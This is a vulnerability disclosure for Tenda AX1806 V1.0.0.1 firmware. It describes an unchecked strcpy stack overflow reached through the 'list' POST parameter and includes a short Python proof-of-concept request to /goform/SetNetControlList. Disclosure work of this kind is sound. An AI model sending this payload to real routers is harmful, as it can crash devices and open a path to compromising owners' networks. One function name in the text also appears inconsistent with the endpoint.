## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3422.html

## Affected version

AX1806 V1.0.0.1

## Vulnerability details

The Tenda AX1806 V1.0.0.1 firmware has a stack overflow vulnerability in the `sub_656BC` function. 

The `v1` variable receives the `list` parameter from a POST request and is passed to function `formSetQosBand`.

![image-20240629164741576](SetNetControlList/image-20240629164741576.png)

In the following processing function, the length of this parameter is not detected

Here in the `strcpy` function, a stack overflow is caused

![image-20240629164804142](SetNetControlList/image-20240629164804142.png)

## POC

```
import requests

ip = "192.168.2.1"
url = "http://" + ip + "/goform/SetNetControlList"

data = {"list":"A"*0x130+"\n"}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240629164858644](SetNetControlList/image-20240629164858644.png)